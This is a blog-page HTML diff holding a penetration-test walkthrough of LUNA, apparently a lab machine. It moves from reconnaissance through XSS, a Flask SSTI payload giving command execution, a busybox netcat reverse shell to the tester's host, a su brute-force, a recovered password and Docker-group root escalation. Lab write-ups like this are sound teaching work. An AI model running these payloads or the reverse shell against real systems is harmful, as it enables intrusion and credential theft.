@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net data:; img-src 'self' https: data:; connect-src 'self' https://abacus.jasoncameron.dev https://script.google.com https://script.googleusercontent.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-src 'none'">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>LUNA – Penetration Test Report | Pavin Das</title>
+    <meta name="description"
+        content="A VAPT assessment report on the LUNA application identifying critical security weaknesses including SSTI, RCE, XSS, and Privilege Escalation.">
+    <meta name="author" content="Pavin Das">
+    <meta name="keywords"
+        content="LUNA, VAPT, Vulnerability Assessment, Penetration Testing, Web Application Security, SSTI, RCE, XSS, Privilege Escalation, Pavin Das">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="alternate" type="text/markdown" title="LLM-friendly version" href="/llms.txt" />
+</head>
+
+<body>
+    <canvas id="particles"></canvas>
+
+    <header>
+        <div class="nav-container">
+            <a href="../index.html" class="logo">PAVIN<span>DAS</span></a>
+            <nav>
+                <span class="blog-views"><i class="fa-regular fa-eye"></i> <span id="blog-page-views">Loading...</span>
+                    reads</span>
+                <a href="../blog.html" class="nav-link">← Back to Blogs</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section>
+            <div class="container">
+                <article class="glass-strong blog-article">
+                    <center>
+                        <h1 class="section-title">Penetration Test Report: LUNA</h1>
+                        <div class="blog-post-subtitle"
+                            style="margin-top: 0.5rem; margin-bottom: 1.5rem; font-size: 1.1rem; color: rgb(224, 255, 224); font-family: inherit; font-weight: 500;">
+                            Walkthrough for the LUNA Web application
+                        </div>
+                        <img src="/images/Luna/Luna.png" style="width: 100%;" alt="">
+                    </center>
+
+                    <pre class="blog-content">
+
+<br>
+<h2>Target Information</h2>
+<li><b>Application name:</b> <span>LUNA</span></li>
+<li><b>Application URL:</b> <a href="http://192.168.1.42:5000/" target="_blank" rel="noopener noreferrer">http://192.168.1.42:5000/</a></li>
+
+<h2>Testing Details</h2>
+<h3>Assessment Type:</h3>
+<li>Web Application VAPT</li>
+
+<h3>Methodology:</h3>
+<li>OWASP Testing Guide, OWASP Top 10 2021</li>
+
+<h3>Tools used:</h3>
+<li>Nmap</li>
+<li>Burp Suite CE</li>
+<li>CyberChef</li>
+<li>GTFOBins</li>
+
+<hr>
+
+<h2>1. Executive Summary</h2>
+A comprehensive web application security assessment was performed against the LUNA application. The assessment identified multiple vulnerabilities including client-side injection, server-side template injection leading to remote code execution, credential exposure, weak credential storage, authentication weaknesses and privilege escalation paths.
+
+<h2>2. Findings Summary</h2>
+<table style="width:100%; text-align: left; border-collapse: collapse; margin-bottom: 2rem;">
+    <tr>
+        <th style="border: 1px solid #ddd; padding: 8px;">Finding</th>
+        <th style="border: 1px solid #ddd; padding: 8px;">Severity</th>
+        <th style="border: 1px solid #ddd; padding: 8px;">OWASP Mapping</th>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">SSTI</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: red;">Critical</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A03 Injection</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">RCE via SSTI</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: red;">Critical</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A03 Injection</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">Credential Exposure</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: tomato;">High</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A05 Security Misconfiguration</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">Weak Password Storage</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: tomato;">High</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A02 Cryptographic Failures</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">Authentication Weakness</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: tomato;">High</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A07 Identification and Authentication Failures</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">Docker Privilege Escalation</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: tomato;">High</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A05 Security Misconfiguration</td>
+    </tr>
+    <tr>
+        <td style="border: 1px solid #ddd; padding: 8px;">Reflected XSS</td>
+        <td style="border: 1px solid #ddd; padding: 8px; color: orange;">Medium</td>
+        <td style="border: 1px solid #ddd; padding: 8px;">A03 Injection</td>
+    </tr>
+</table>
+
+<h2>3. Vulnerability Details</h2>
+
+<h3><span>3.1 Reflected Cross Site Scripting</span></h3>
+A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the user input field of the application. The application reflected user supplied input in the response without proper validation or output encoding. As a result, malicious JavaScript code supplied by an attacker could be executed within the victim’s browser session.
+
+
+<h3><span>3.2 Server Side Template Injection</span></h3>
+A Server-Side Template Injection (SSTI) vulnerability was identified in the input processing functionality of the application. User supplied input was evaluated by the backend template engine instead of being treated as plain text. The application processed template expressions directly and returned evaluated results to the response.
+
+
+<h3><span>3.3 Remote Code Execution via Template Injection</span></h3>
+A Remote Code Execution (RCE) vulnerability was identified through exploitation of the previously discovered Server-Side Template Injection (SSTI) vulnerability. The backend template engine allowed execution of server-side expressions and access to application objects. By leveraging this behavior, arbitrary system commands were executed on the target server.
+
+
+<h3><span>3.4 Credential Exposure in Configuration File</span></h3>
+A sensitive information exposure issue was identified during post-exploitation validation activities. The application configuration file contained plaintext database credentials and connection details that were accessible from the compromised environment. The configuration file stored sensitive information including database username, password, and connection parameters without implementing adequate protection mechanisms.
+
+
+<h3><span>3.5 Weak Password Storage Using Base64</span></h3>
+A weakness was identified in the credential storage mechanism where user passwords were stored using Base64 encoding instead of secure cryptographic hashing techniques. Base64 is an encoding method designed for data representation and transmission purposes, it does not provide confidentiality, encryption, or one-way protection. Any encoded value can be easily decoded to retrieve the original password.
+
+
+<h3><span>3.6 Privilege Escalation via Docker Group</span></h3>
+A privilege escalation vulnerability was identified due to improper assignment of user privileges. The compromised user account was a member of the Docker group, which allowed interaction with the Docker daemon. Membership in the Docker group effectively provides elevated privileges because users can create and execute privileged containers capable of interacting with the host operating system.
+
+<hr>
+
+<h2>4. Steps to Reproduce</h2>
+
+<h3><span>Step 1: Reconnaissance and Initial Enumeration</span></h3>
+<li>Performed port discovery using Nmap to identify exposed services.</li>
+<li>Identified two open ports: 80 and 5000.</li>
+<img src="/images/Luna/1.png" alt="">
+<li>Both ports were ruining HTTP services.</li>
+<li>Access to port 80 returned a restricted response and was inaccessible.</li>
+<img src="/images/Luna/2.png" alt="">
+<li>Continued the assessment against the service hosted on port 5000.</li>
+<img src="/images/Luna/3.png" alt="">
+
+<h3><span>Step 2: Input Testing</span></h3>
+<li>Accessed the web application interface.</li>
+<li>Identified a user input field associated with the “Greet Me” functionality.</li>
+<li>Submitted a normal text to understand application behavior.</li>
+<img src="/images/Luna/4.png" alt="">
+<li>Observed that the supplied input was reflected back within the response message.</li>
+<img src="/images/Luna/5.png" alt="">
+
+<h3><span>Step 3: Cross Site Scripting Testing</span></h3>
+<li>Submitted an XSS payload through the input field.</li>
+<img src="/images/Luna/6.png" alt="">
+<li>Observed successful execution of the payload.</li>
+<img src="/images/Luna/7.png" alt="">
+
+<h3><span>Step 4: Server Side Template Injection Testing</span></h3>
+<li>Performed server side validation using an SSTI payload.</li>
+<li>Submitted the payload through the available input field.</li>
+<img src="/images/Luna/8.png" alt="">
+<li>Observed evaluation of the template expression.</li>
+<img src="/images/Luna/9.png" alt="">
+<li>Confirmed that the application was vulnerable to Server Side Template Injection (SSTI)</li>
+
+<h3><span>Step 5: Template Engine Identification & RCE Testing</span></h3>
+<li>Used an error trigger payload to identify backend technologies.</li>
+<img src="/images/Luna/10.png" alt="">
+<li>Observed that the application was using Python Flask.</li>
+<img src="/images/Luna/11.png" alt="">
+<li>Submitted a Python based payload to verify code execution capability.</li>
+<article class="glass-strong blog-article">→ {{config.__class__.__init__.__globals__['id'].popen('ls').read()}}</article>
+<img src="/images/Luna/12.png" alt="">
+<li>Confirmed successful Remote Code Execution.</li>
+
+<h3><span>Step 6: Reverse Shell Establishment</span></h3>
+<li>Selected an appropriate reverse shell payload from revshells.com.</li>
+<article class="glass-strong blog-article">→ busybox nc 192.168.1.39 6666 -e sh</article>
+<li>Started a Netcat listener on the assessment machine.</li>
+<img src="/images/Luna/13.png" alt="">
+<li>Executed the payload through the vulnerable functionality.</li>
+<li>Established a successful reverse shell connection.</li>
+<img src="/images/Luna/14.png" alt="">
+
+<h3><span>Step 7: Credential Discovery</span></h3>
+<li>Reviewed application files after obtaining access</li>
+<li>Identified a configuration file.</li>
+<img src="/images/Luna/15.png" alt="">
+<li>The config file contains the credentials for accessing the MySQL database.</li>
+<img src="/images/Luna/16.png" alt="">
+<li>Used the recovered credentials to access the database and enumerate stored records and user information.</li>
+<img src="/images/Luna/17.png" alt="">
+
+<h3><span>Step 8: Weak Password Storing</span></h3>
+<li>Identified a password in the database that was encoded in Base64.</li>
+<li>Decoded the value using CyberChef.</li>
+<img src="/images/Luna/18.png" alt="">
+<li>Used the recovered credential for authentication validation.</li>
+<img src="/images/Luna/19.png" alt="">
+
+<h3><span>Step 9: User Enumeration</span></h3>
+<li>Obtained use level access successfully.</li>
+<img src="/images/Luna/20.png" alt="">
+<li>Identified an text file containing multiple passwords.</li>
+<img src="/images/Luna/21.png" alt="">
+<li>Used Sudo_BruteForce to perform brute-force attacks and discovered passwords for other user accounts.</li>
+<article class="glass-strong blog-article">→ git clone https://github.com/Maalfer/Sudo_BruteForce.git <br>→ cd Sudo_BruteForce <br>→ bash Linux-Su-Force.sh jose ../password.txt</article>
+<img src="/images/Luna/22.png" alt="">
+<article class="glass-strong blog-article">→ Credential > jose:W1nter$2024</article>
+<li>Successfully obtained access to another user account.</li>
+<article class="glass-strong blog-article">→ su jose</article>
+<img src="/images/Luna/23.png" alt="">
+
+<h3><span>Step 10: Privilege Escalation</span></h3>
+<li>Performed SUID enumeration and permission checks.</li>
+<img src="/images/Luna/24.png" alt="">
+<li>Didn’t identify exploitable SUID binaries.</li>
+<li>Performed user group enumeration</li>
+<img src="/images/Luna/25.png" alt="">
+<li>Identified membership in the Docker group.</li>
+<li>Used Docker privilege escalation techniques from gtfobins.org</li>
+<img src="/images/Luna/26.png" alt="">
+<article class="glass-strong blog-article">→ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh</article>
+<li>Obtained administrative privilege successfully.</li>
+<img src="/images/Luna/27.png" alt="">
+<hr>
+
+<h2><span>Conclusion</span></h2>
+Thank you for taking the time to read through this walkthrough!
+
+If you are following along, I highly encourage you to use this walkthrough as a reference and try rooting the machine yourself. Hands-on practice is the best way to learn, so try to explore and experiment without copying every step directly.
+
+<b><span>Best of luck on your hacking journey!</span></b>
+                    </pre>
+                </article>
+            </div>
+        </section>
+    </main>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
